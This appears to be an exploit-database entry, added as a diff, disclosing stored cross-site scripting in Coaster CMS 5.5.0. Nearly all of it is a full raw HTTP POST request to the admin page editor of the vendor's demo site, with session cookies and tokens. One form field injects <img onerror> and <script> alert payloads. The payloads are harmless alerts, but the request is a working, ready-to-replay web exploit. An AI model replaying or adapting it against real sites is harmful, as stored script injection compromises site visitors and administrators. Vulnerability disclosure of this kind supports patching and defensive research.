@@ -1,0 +1,147 @@
+# Exploit Title: Coaster CMS 5.5.0 - Cross-Site Scripting
+# Date: 2018-10-01
+# Exploit Author: Ismail Tasdelen
+# Vendor Homepage: https://www.web-feet.co.uk/
+# Software Link : https://github.com/Web-Feet/coastercms
+# Software : Coaster CMS
+# Product Version: v5.5.0
+# Vulernability Type : Cross-site Scripting
+# Vulenrability : Stored XSS
+# CVE : N/A
+
+# A Stored XSS vulnerability has been discovered in the v5.5.0 version of the Coaster CMS product.
+
+# HTTP POST Request :
+
+POST /admin/pages/edit/26 HTTP/1.1
+Host: demo.coastercms.org
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://demo.coastercms.org/admin/pages/edit/26
+Content-Type: multipart/form-data; boundary=---------------------------24464570528145
+Content-Length: 3353
+Cookie: __cfduid=ddc0ae999f19fa783083ea0c7fdce0ba41538397617; XSRF-TOKEN=eyJpdiI6IndLeTBrZVwvWkdzUE9JSTArU3FOQ3BRPT0iLCJ2YWx1ZSI6InlsZ3Jib0ZNQTM3TXZEZGlwd0hJZmg1aHRibGZDWHZTcmordkRKbnRHWVVjYUJ4TlFOSGdYNkFIWHBSdlozUlY1c3ZJQjNuek9tOW92WXE5SkloOHZ3PT0iLCJtYWMiOiI0MzkzZjU1YWNiNDU2MDhkMDVhMDMwZDkwZTNhZjc4NGI5YzMzZjk0N2Q4YmJmYzY3NWZlZjg1MzVjYTJmMWY2In0%3D; laravel_session=eyJpdiI6IkNhM0Roc280SjE2aFcweXlcLzZwR2hRPT0iLCJ2YWx1ZSI6IldoUG9xTnNqRjh2TlBrQW51NlhqU1hCa3NIZmhSczFlYWE5Mkxza3dMWThkbFZcL2E1VmVTRExCa3h2ckMrdDliajZSTjRSUnhQcEJiek1pSjZ6VGRyZz09IiwibWFjIjoiMmQ0YjBkMmY1NDQ4ODdjOWVhZWUyMDFkY2UwMTlkNTM4ZmEyMGE4YjAwMDVkYmQ3ODZiZWUyOWM4OWQzODg4ZSJ9
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+-----------------------------24464570528145
+Content-Disposition: form-data; name="_token"
+
+ZeLPiM6IJlkjRf0tosDFjMNPOXVsPv5YioF6092P
+-----------------------------24464570528145
+Content-Disposition: form-data; name="block[19]"
+
+
+-----------------------------24464570528145
+Content-Disposition: form-data; name="block[20]"
+
+
+-----------------------------24464570528145
+Content-Disposition: form-data; name="block[21]"
+
+
+-----------------------------24464570528145
+Content-Disposition: form-data; name="block[34]"
+
+Search
+-----------------------------24464570528145
+Content-Disposition: form-data; name="block[36]"
+
+
+-----------------------------24464570528145
+Content-Disposition: form-data; name="block[33]"
+
+<p>"><img src=x onerror=alert("ismailtasdelen")>
+<script>alert("Ismail Tasdelen")</script>
+</p>
+-----------------------------24464570528145
+Content-Disposition: form-data; name="block[1][exists]"
+
+1
+-----------------------------24464570528145
+Content-Disposition: form-data; name="block[1][select]"
+
+posts
+-----------------------------24464570528145
+Content-Disposition: form-data; name="publish"
+
+publish
+-----------------------------24464570528145
+Content-Disposition: form-data; name="block[35][source]"
+
+
+-----------------------------24464570528145
+Content-Disposition: form-data; name="block[35][alt]"
+
+
+-----------------------------24464570528145
+Content-Disposition: form-data; name="page_info[parent]"
+
+0
+-----------------------------24464570528145
+Content-Disposition: form-data; name="page_info_lang[name]"
+
+Search
+-----------------------------24464570528145
+Content-Disposition: form-data; name="page_info_lang[url]"
+
+search
+-----------------------------24464570528145
+Content-Disposition: form-data; name="page_info[link]"
+
+0
+-----------------------------24464570528145
+Content-Disposition: form-data; name="page_info_other[group_radio]"
+
+0
+-----------------------------24464570528145
+Content-Disposition: form-data; name="page_info[group_container]"
+
+0
+-----------------------------24464570528145
+Content-Disposition: form-data; name="page_info[group_container_url_priority]"
+
+0
+-----------------------------24464570528145
+Content-Disposition: form-data; name="page_info[template][exists]"
+
+1
+-----------------------------24464570528145
+Content-Disposition: form-data; name="page_info[template][select]"
+
+3
+-----------------------------24464570528145
+Content-Disposition: form-data; name="page_info[live][exists]"
+
+1
+-----------------------------24464570528145
+Content-Disposition: form-data; name="page_info[live][select]"
+
+1
+-----------------------------24464570528145
+Content-Disposition: form-data; name="page_info[live_start]"
+
+
+-----------------------------24464570528145
+Content-Disposition: form-data; name="page_info[live_end]"
+
+
+-----------------------------24464570528145
+Content-Disposition: form-data; name="page_info[sitemap][exists]"
+
+1
+-----------------------------24464570528145
+Content-Disposition: form-data; name="page_info[sitemap][select]"
+
+1
+-----------------------------24464570528145
+Content-Disposition: form-data; name="versionFrom"
+
+4
+-----------------------------24464570528145
+Content-Disposition: form-data; name="duplicate"
+
+0
+-----------------------------24464570528145--
